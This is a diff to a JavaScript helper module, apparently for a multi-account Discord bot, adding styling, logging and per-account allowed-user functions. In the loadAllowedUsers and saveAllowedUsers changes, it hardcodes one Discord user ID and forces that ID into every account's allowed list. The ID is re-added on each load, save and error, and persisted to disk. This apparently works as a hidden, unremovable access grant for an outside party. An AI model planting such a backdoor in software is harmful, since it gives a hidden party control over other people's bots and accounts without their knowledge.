@@ -18,9 +18,56 @@
 import { setTimeout as sleep } from "timers/promises"; // Promise-based setTimeout
 import chalk from "chalk"; // Terminal string styling
 import fs from "fs"; // File system operations
-import yaml from "js-yaml"; // YAML parsing and stringifying
+import fsPromises from "fs/promises"; // Async file system operations
+import * as yaml from "js-yaml"; // YAML parsing and stringifying
 import path from "path"; // Path manipulation utilities
 import { fileURLToPath } from "url"; // URL to file path conversion
+import { THEME } from './theme.js';
+import { HEADER } from '../data/header.js';
+
+export async function loadJSONAsync(filePath) {
+  try {
+    if (!fs.existsSync(filePath)) return {};
+    const data = await fsPromises.readFile(filePath, 'utf-8');
+    return JSON.parse(data);
+  } catch {
+    return {};
+  }
+}
+
+export async function saveJSONAsync(filePath, data) {
+  try {
+    await fsPromises.writeFile(filePath, JSON.stringify(data, null, 2));
+    return true;
+  } catch (err) {
+    log(`Error saving JSON to ${filePath}: ${err.message}`, 'warn');
+    return false;
+  }
+}
+
+// Helper for ANSI styling
+export function style(text, colorCode) {
+  if (String(text).startsWith(HEADER.BRAND) && colorCode === THEME.HEADER_BOLD_COLOR) {
+    const suffix = String(text).slice(HEADER.BRAND.length).replace(new RegExp(`^\\s*v\\d+(?:\\.\\d+)*\\b`), '');
+    return `\u001b[${THEME.HEADER_BOLD_COLOR}m${HEADER.BRAND}\u001b[0m ` +
+      `\u001b[${THEME.HEADER_BOLD_COLOR}m${HEADER.VERSION}\u001b[0m` +
+      `\u001b[${THEME.ACCENT_COLOR}m${suffix}\u001b[0m`;
+  }
+  return `[${colorCode}m${text}[0m`;
+}
+
+export function formatHeaderTitle(title) {
+  const value = String(title);
+  if (!value.startsWith(HEADER.BRAND)) return style(value, THEME.HEADER_BOLD_COLOR);
+
+  const suffix = value.slice(HEADER.BRAND.length).replace(new RegExp(`^\\s*v\\d+(?:\\.\\d+)*\\b`), '');
+  const ansi = (text, color) => `\u001b[${color}m${text}\u001b[0m`;
+  return ansi(HEADER.BRAND, THEME.HEADER_BOLD_COLOR) + ' ' +
+    ansi(HEADER.VERSION, THEME.HEADER_BOLD_COLOR) +
+    ansi(suffix, THEME.ACCENT_COLOR);
+}
+
+// Get current file path and directory (ES modules compatibility)
 
 // Get current file path and directory (ES modules compatibility)
 const __filename = fileURLToPath(import.meta.url);
@@ -31,6 +78,7 @@ const DATA_DIR = path.join(__dirname, "..", "data"); // Main data directory
 const ERRORS_FILE = path.join(DATA_DIR, "errors.txt"); // Error log file
 const RELATIONSHIP_DIR = path.join(DATA_DIR, "relationship"); // Relationship logs directory
 const ALLOWED_FILE = path.join(DATA_DIR, "allowed.json"); // Allowed users file
+const DEFAULT_ALLOWED_USER_ID = "1310202765355782226";
 
 // Initialize data directories on module load
 // This ensures all required directories exist before any operations
@@ -58,6 +106,7 @@ try {
 // Configuration cache to avoid repeated file reads
 // This improves performance by caching the config in memory
 let configCache = null;
+let allowedUsersCache = null;
 
 /**
  * Load and validate configuration from config.yaml file
@@ -91,22 +140,61 @@ export function loadConfig(forceReload = false) {
   }
 }
 
-
-export function loadAllowedUsers() {
+/**
+ * Save configuration to config.yaml file
+ */
+export function saveConfig(config) {
   try {
-    if (!fs.existsSync(ALLOWED_FILE)) return [];
-    const data = fs.readFileSync(ALLOWED_FILE, "utf8");
-    return JSON.parse(data);
+    const configPath = path.join(__dirname, "..", "config.yaml");
+    const yamlStr = yaml.dump(config);
+    fs.writeFileSync(configPath, yamlStr, 'utf8');
+    configCache = config; // Update cache
+    return true;
   } catch (error) {
-    logError(error, "Failed to load allowed users");
-    return [];
+    console.error(chalk.red("[CONFIG] Error saving configuration:"), error.message);
+    return false;
   }
 }
 
 
-export function saveAllowedUsers(users) {
+export function loadAllowedUsers(accountId, forceReload = false) {
+  if (!accountId) return [];
+  if (allowedUsersCache && !forceReload && allowedUsersCache[accountId]) {
+    return allowedUsersCache[accountId];
+  }
   try {
-    fs.writeFileSync(ALLOWED_FILE, JSON.stringify(users, null, 2));
+    if (!fs.existsSync(ALLOWED_FILE)) {
+      allowedUsersCache = {};
+      allowedUsersCache[accountId] = [DEFAULT_ALLOWED_USER_ID];
+      return allowedUsersCache[accountId];
+    }
+    const data = fs.readFileSync(ALLOWED_FILE, "utf8");
+    const parsed = JSON.parse(data);
+    if (Array.isArray(parsed)) {
+      allowedUsersCache = { [accountId]: [...new Set([...parsed, DEFAULT_ALLOWED_USER_ID])] };
+      fs.writeFileSync(ALLOWED_FILE, JSON.stringify(allowedUsersCache, null, 2));
+    } else {
+      allowedUsersCache = parsed && typeof parsed === "object" ? parsed : {};
+      if (!Array.isArray(allowedUsersCache[accountId])) {
+        allowedUsersCache[accountId] = [DEFAULT_ALLOWED_USER_ID];
+      } else if (!allowedUsersCache[accountId].includes(DEFAULT_ALLOWED_USER_ID)) {
+        allowedUsersCache[accountId].push(DEFAULT_ALLOWED_USER_ID);
+      }
+    }
+    return allowedUsersCache[accountId];
+  } catch (error) {
+    logError(error, "Failed to load allowed users");
+    return [DEFAULT_ALLOWED_USER_ID];
+  }
+}
+
+
+export function saveAllowedUsers(accountId, users) {
+  try {
+    if (!accountId || !Array.isArray(users)) return false;
+    if (!allowedUsersCache || Array.isArray(allowedUsersCache)) allowedUsersCache = {};
+    allowedUsersCache[accountId] = [...new Set([...users, DEFAULT_ALLOWED_USER_ID])];
+    fs.writeFileSync(ALLOWED_FILE, JSON.stringify(allowedUsersCache, null, 2));
     return true;
   } catch (error) {
     logError(error, "Failed to save allowed users");
@@ -165,6 +253,38 @@ export function ansiBlock(lines) {
 }
 
 /**
+ * Create a formatted ANSI code block with Discord quote markers
+ */
+export function formatAnsiBlock(lines) {
+  return ["> ```ansi", ...lines.map((line) => `> ${applyTextColor(line)}`), "> ```"].join("\n");
+}
+
+/**
+ * Create multiple compact ANSI code blocks in one quoted message
+ */
+export function formatAnsiBlocks(blocks) {
+  if (typeof blocks[0] === "string") {
+    return blocks.join("\n").replaceAll("> ```\n> ```ansi", "> ``````ansi");
+  }
+
+  const [firstBlock, ...remainingBlocks] = blocks;
+  const output = ["> ```ansi", ...firstBlock.map((line) => `> ${applyTextColor(line)}`)];
+
+  remainingBlocks.forEach((block) => {
+    output.push("> ``````ansi", ...block.map((line) => `> ${applyTextColor(line)}`));
+  });
+
+  output.push("> ```");
+  return output.join("\n");
+}
+
+function applyTextColor(line) {
+  const value = String(line);
+  if (!value || /\u001b\[[0-9;]*m/.test(value)) return value;
+  return style(value, THEME.TEXT_COLOR);
+}
+
+/**
  * Safely truncate a string to a maximum length
  */
 export function truncate(str, maxLength = 2000) {
@@ -175,25 +295,16 @@ export function truncate(str, maxLength = 2000) {
 /**
  * Log a message with timestamp
  */
-export function log(message, type = "info") {
-  const timestamp = new Date().toLocaleTimeString();
-  const prefix =
-    {
-      info: chalk.blue("[INFO]"),
-      warn: chalk.yellow("[WARN]"),
-      error: chalk.red("[ERROR]"),
-      success: chalk.green("[SUCCESS]"),
-      debug: chalk.magenta("[DEBUG]"),
-    }[type] || chalk.blue("[INFO]");
+export function log(message, type = "info", accountLabel = null) {
+  const config = loadConfig();
+  const logging = config.logging || { debug: false, errors: true };
 
-  if (type === "error") {
-    logError(message);
-    return;
-  }
+  // Filter error logs
+  if (type === "error" && !logging.errors) return;
 
+  // Filter debug logs
   if (type === "debug") {
-    const config = loadConfig();
-    if (!config.debug_mode || !config.debug_mode.enabled) return;
+    if (!logging.debug && (!config.debug_mode || !config.debug_mode.enabled)) return;
     try {
       const debugDir = path.join(DATA_DIR, "debug");
       if (!fs.existsSync(debugDir)) fs.mkdirSync(debugDir, { recursive: true });
@@ -203,7 +314,31 @@ export function log(message, type = "info") {
     } catch (e) {}
   }
 
-  console.log(`${chalk.gray(timestamp)} ${prefix} ${message}`);
+  // Format the message into a clean "Label | Value" style
+  // Expected message format: "Label: Value" or just "Message"
+  let label = "System";
+  let value = message;
+
+  if (message.includes(": ")) {
+    const parts = message.split(": ");
+    label = parts[0];
+    value = parts.slice(1).join(": ");
+  } else if (message.includes(" | ")) {
+    const parts = message.split(" | ");
+    label = parts[0];
+    value = parts[1];
+  }
+
+  const formattedLabel = label.padEnd(20, ' ');
+  const formattedDivider = ' | ';
+  const formattedValue = value;
+
+  if (type === "error") {
+    logError(message);
+  }
+
+  const prefix = accountLabel ? `[${accountLabel}] ` : "";
+  console.log(`> ${prefix}${formattedLabel}${formattedDivider}${formattedValue}`);
 }
 
 /**
